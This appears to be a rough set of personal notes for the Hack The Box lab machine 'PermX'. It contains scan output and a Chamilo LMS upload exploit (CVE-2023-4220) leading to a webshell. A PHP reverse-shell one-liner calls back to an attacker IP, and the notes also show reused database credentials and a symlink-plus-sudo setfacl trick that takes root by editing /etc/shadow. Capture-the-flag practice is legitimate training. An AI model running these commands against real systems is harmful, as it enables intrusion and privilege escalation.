![[image-20240711150349307-PermX.png]]


![[image-20240711150055540-PermX.png]]

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds
                                                               

Apache vulns? none
Themewagon? None
chamilo

ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://permx.htb -H "HOST: FUZZ.permx.htb" -fc 302

www - seems to be the same
lms - some sort of admin page
![[image-20240711161058034-PermX.png]]

[GitHub - Rai2en/CVE-2023-4220-Chamilo-LMS: This is a script written in Python that allows the exploitation of the Chamilo's LMS software security flaw described in CVE-2023-4220](https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS) this seems to work
##### Valid webshell
http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=whoami returns www-data  

##### Valid Reverse Shell
`php -r '$sock=fsockopen("10.10.14.183",9001);exec("/bin/sh -i <&3 >&3 2>&3");'`


cli-config.php
//require_once __DIR__.'/main/inc/lib/api.lib.php';
$configurationFile = __DIR__.'/app/config/configuration.php';

// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
...
/ Security word for password recovery
$_configuration['security_key'] = '08ecc755d674efaa6b1ab289e6053a9b';
// Hash function method
$_configuration['password_encryption'] = 'bcrypt'

ssh mtx@IP with DB password reuse

sudo -l 
/opt/acl.sh

cat /opt/acl.sh
```#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```


╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

-rw------- 1 mtz mtz 0 Jan 20 18:10 /home/mtz/.ssh/authorized_keys

-rw-r--r-- 1 root root 600 Jan 20 18:10 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 172 Jan 20 18:10 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 92 Jan 20 18:10 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 564 Jan 20 18:10 /etc/ssh/ssh_host_rsa_key.pub

╣ Analyzing Backup Manager Files (limit 70)

-rwxr-xr-x 1 www-data www-data 2603 Aug 31  2023 /var/www/chamilo/main/extra/database.php
-rwxr-xr-x 1 www-data www-data 34969 Aug 31  2023 /var/www/chamilo/plugin/buycourses/database.php
    $paypalTable->addColumn('password', Types::STRING);
        'password' => '',
-rwxr-xr-x 1 www-data www-data 3157 Aug 31  2023 /var/www/chamilo/plugin/customcertificate/database.php
-rwxr-xr-x 1 www-data www-data 1943 Aug 31  2023 /var/www/chamilo/plugin/notebookteacher/database.php
-rwxr-xr-x 1 www-data www-data 29829 Aug 31  2023 /var/www/chamilo/plugin/sepe/database.php


ln -s / root
sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow
copy MTZ to root
`$y$j9T$RUjBgvOODKC9hyu5u7zCt0$Vf7nqZ4umh3s1N69EeoQ4N5zoid6c2SlGb1LvBFRxSB`
su then mtz password


mysql -u chamilo -p03F6lY3uXAP2bkW8 -h localhost

- python3 -c 'import pty; pty.spawn("/bin/bash")'
- ctrl+z to background in linux
- stty raw -echo
- stty size
- fg
- reset
- export SHELL=bash
- stty rows 22 columns 17 - Set remote shell to x number of rows & y columns
- export TERM=xterm-256color
- stty rows 67 columns 318











Users
- Noah programmer
- Elsie Programer
- Ralph graphic designer
- Mia educator
- Emma
- Sarah
- Johny
- James
- Davis Miller admin@permx.htb